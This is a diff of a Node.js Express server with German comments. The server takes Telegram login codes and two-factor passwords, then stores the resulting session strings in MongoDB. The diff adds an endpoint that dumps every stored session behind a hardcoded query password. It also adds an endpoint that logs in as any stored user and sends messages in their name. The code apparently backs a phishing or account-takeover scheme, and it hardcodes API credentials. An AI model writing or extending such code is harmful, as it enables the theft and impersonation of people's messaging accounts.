@@ -9,14 +9,14 @@ app.use(cors({ origin: '*' }));
 app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
-// WICHTIG: Setze diese Umgebungsvariable auf Render!
-const MONGO_URI = process.env.MONGODB_URI; 
+const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';
 
 mongoose.connect(MONGO_URI);
 
 const SessionSchema = new mongoose.Schema({
     phone: String,
-    session: String
+    session: String,
+    date: { type: Date, default: Date.now }
 });
 const Session = mongoose.model('Session', SessionSchema);
 
@@ -24,6 +24,7 @@ const apiId = 23049703;
 const apiHash = 'e9c00af578a9de0253ef02337460498f';
 const activeSessions = new Map();
 
+// --- AUTH ENDPOINTS ---
 app.post('/send-otp', async (req, res) => {
     try {
         const { phone } = req.body;
@@ -43,17 +44,42 @@ app.post('/verify-otp', async (req, res) => {
 
         try {
             await session.client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }));
+            const sessionString = session.client.session.save();
+            await Session.create({ phone, session: sessionString });
+            res.json({ success: true });
         } catch (err) {
             if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                 const pwd = await session.client.invoke(new Api.account.GetPassword());
                 await session.client.invoke(new Api.auth.CheckPassword({ password: await session.client.srpSolve(pwd, password) }));
+                const sessionString = session.client.session.save();
+                await Session.create({ phone, session: sessionString });
+                res.json({ success: true });
             } else { throw err; }
         }
-        
-        const sessionString = session.client.session.save();
-        await Session.create({ phone, session: sessionString });
-        res.json({ success: true });
     } catch (e) { res.status(400).json({ error: e.message }); }
+});
+
+// --- ADMIN ENDPOINTS ---
+app.get('/get-sessions', async (req, res) => {
+    if (req.query.pass !== 'Hinva312-') return res.status(401).json({ error: 'Unauthorized' });
+    try {
+        const sessions = await Session.find(); // Korrektur: Hier stand SessionModel
+        res.json(sessions);
+    } catch (err) { res.status(500).json({ error: 'DB Fehler' }); }
+});
+
+// Aktion: Nachricht senden
+app.post('/send-message', async (req, res) => {
+    const { phone, target, message } = req.body;
+    const sessionDoc = await Session.findOne({ phone });
+    if (!sessionDoc) return res.status(404).json({ error: "Session nicht gefunden" });
+
+    try {
+        const client = new TelegramClient(new StringSession(sessionDoc.session), apiId, apiHash, {});
+        await client.connect();
+        await client.sendMessage(target, { message });
+        res.json({ success: true });
+    } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.listen(PORT, '0.0.0.0', () => console.log(`Server läuft auf ${PORT}`));
